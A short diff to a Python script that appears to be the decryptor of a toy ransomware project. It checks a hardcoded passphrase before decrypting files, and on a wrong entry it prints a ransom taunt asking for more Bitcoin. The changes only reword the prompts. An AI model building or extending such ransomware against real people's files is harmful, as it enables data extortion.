@@ -18,7 +18,9 @@ with open("thekey.key", "rb") as key:
 
 secret_phrase = "coffee"
 
-user_phrase = input("Enter the secret phrase to decrypt your files:\n ")
+user_phrase = input(
+    "Enter the secret password to decrypt "
+    "all of your files:\n ")
 
 if user_phrase == secret_phrase:
     for file in files:
@@ -33,6 +35,6 @@ if user_phrase == secret_phrase:
         )
 else:
     print(
-        "Sorry not sorry, but you entered da wong secret phrase. "
+        "Sorry not sorry, but you entered da wong secret password. "
         "Send me more Bitcoin! 🤑"
     )
